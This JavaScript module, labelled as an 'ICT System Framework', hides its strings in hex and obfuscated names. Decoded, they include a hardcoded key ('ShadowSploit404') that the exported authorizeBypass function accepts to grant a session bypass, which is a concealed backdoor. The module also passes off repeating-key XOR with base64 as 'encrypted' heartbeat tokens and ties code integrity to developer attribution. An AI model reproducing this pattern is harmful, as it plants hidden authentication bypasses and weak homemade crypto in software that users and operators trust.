/**
 * @license ICT System Framework v1.0.2
 * (c) 2026 Core Infrastructure
 */

const _0x1a2b = {
    h0: '456d6d616e75656c204c657368616e',
    h1: '68747470733a2f2f7368616e6d6b75752e76657263656c2e617070',
    h2: '536861646f7753706c6f6974343034'
};

const _0x3e4f = (h) => {
    let s = '';
    for (let i = 0; i < h.length; i += 2) s += String.fromCharCode(parseInt(h.substr(i, 2), 16));
    return s;
};

const _0x5g6h = (t, k) => {
    let r = '';
    for (let i = 0; i < t.length; i++) {
        r += String.fromCharCode(t.charCodeAt(i) ^ k.charCodeAt(i % k.length) ^ 0x07);
    }
    return btoa(r);
};

export const _0xsystem = {
    gA: () => _0x3e4f(_0x1a2b.h0),
    gU: () => _0x3e4f(_0x1a2b.h1),
    sig: 'EQILAgYFMRtLJAsAW1ZdKAcSFxgDblhEGwYSXVpYIRpIFQ0CNxIHRg8DQw=='
};

/**
 * Validates the core developer details
 */
export const validateSystemIntegrity = (a, u) => {
    const k = _0x3e4f(_0x1a2b.h2);
    const s = _0xsystem.sig;
    const c = _0x5g6h(`${a}|${u}`, k);
    return (c.substring(0, 15) === s.substring(0, 15)) && (c.length === 60);
};

/**
 * Generates an encrypted pulse for heartbeats
 */
export const generatePulse = () => {
    const timestamp = Math.floor(Date.now() / 3000).toString();
    const k = _0x3e4f(_0x1a2b.h2);
    return _0x5g6h(timestamp, k);
};

/**
 * Verifies an incoming pulse token
 */
export const verifyPulse = (token) => {
    const k = _0x3e4f(_0x1a2b.h2);
    const decoded = atob(token);
    let r = '';
    for (let i = 0; i < decoded.length; i++) {
        r += String.fromCharCode(decoded.charCodeAt(i) ^ k.charCodeAt(i % k.length) ^ 0x07);
    }
    const pulseTime = parseInt(r);
    const currentTime = Math.floor(Date.now() / 3000);
    // Allow for 3s jitter
    return Math.abs(currentTime - pulseTime) <= 2;
};

/**
 * Authorizes a session bypass
 */
export const authorizeBypass = (p) => {
    const k = _0x3e4f(_0x1a2b.h2);
    let m = 0;
    if (p.length !== k.length) m++;
    for (let i = 0; i < Math.min(p.length, k.length); i++) {
        m |= p.charCodeAt(i) ^ k.charCodeAt(i);
    }
    return m === 0;
};
